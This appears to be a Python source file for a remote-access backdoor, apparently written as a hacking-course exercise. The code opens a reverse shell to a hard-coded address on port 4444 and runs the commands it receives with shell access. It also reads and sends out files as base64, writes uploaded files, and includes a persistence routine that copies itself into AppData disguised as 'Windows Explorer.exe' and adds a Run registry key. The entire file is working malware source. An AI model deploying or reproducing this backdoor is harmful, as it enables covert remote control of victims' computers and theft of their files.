#!/usr/bin/python

import socket, subprocess, json, os, base64, sys, shutil

class Backdoor:
    def __init__(self, ip, port):
        # self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_recieve(self):
        # json_data = self.connection.recv(1024) # unwrapping
        # return json.loads(json_data)
        json_data = ""
        while True: # if the package size is large, we need this loop
            try:
                json_data += self.connection.recv(1024) # unwrapping
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, 'wb')  # needed for python2
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL) # when using python3, put subprocess.DEVNULL instead of DEVNULL and remove DEVNULL = ... part
        # try: # above
        # except subprocess.CalledProcessError:
        #     return "error during command execution"

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful"

    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location) # substitute sys.exectuable with "__file__" if you want .py file as it is
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)


    def run(self):
        while True:
            # command = self.connection.recv(1024) # buffer size
            # try:
            #     command = self.reliable_recieve()
            #     if command[0] == "exit":
            #         self.connection.close()
            #         sys.exit()
            #     elif command[0] == "cd" and len(command) > 1:
            #         command_result = self.change_working_directory_to(command[1])
            #     elif command[0] == "download":
            #         command_result = self.read_file(command[1])
            #     elif command[0] == "upload":
            #         command_result = self.write_file(command[1], command[2])
            #     else:
            #         command_result = self.execute_system_command(command)
            # except Exception:
            #     command_result = "[-] Error during command execution"

            command = self.reliable_recieve()
            if command[0] == "exit":
                self.connection.close()
                sys.exit()
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_working_directory_to(command[1])
            elif command[0] == "download":
                command_result = self.read_file(command[1])
            elif command[0] == "upload":
                command_result = self.write_file(command[1], command[2])
            else:
                command_result = self.execute_system_command(command)

            # self.connection.send(command_result)
            self.reliable_send(command_result)
try:
    my_backdoor = Backdoor("192.168.2.105", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()

# Serialization
